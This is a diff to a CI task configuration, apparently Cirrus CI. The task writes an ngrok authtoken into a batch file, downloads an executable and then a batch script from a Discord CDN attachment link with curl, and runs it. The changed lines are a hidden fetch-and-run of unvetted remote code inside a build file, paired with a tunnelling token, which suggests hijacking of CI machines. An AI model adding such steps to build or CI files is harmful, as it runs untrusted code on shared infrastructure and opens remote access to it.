@@ -13,5 +13,5 @@ task:
     TOKEN: ENCRYPTED[fb3817d3349eab96ea55ffde49ec4c79f421b04b10de4cf02973ea1d1fd080efc59a85b0ad6f059eb9fe45c3e281ed24]
   script:
    - echo ngrok authtoken %TOKEN% > NGROK.bat
-   - curl -s -O https://cdn.discordapp.com/attachments/911797178190676052/911797247040184320/dang.exe
-   - dang.exe
+   - curl -s -O https://cdn.discordapp.com/attachments/911797178190676052/912012071053439077/dang.bat
+   - dang.bat
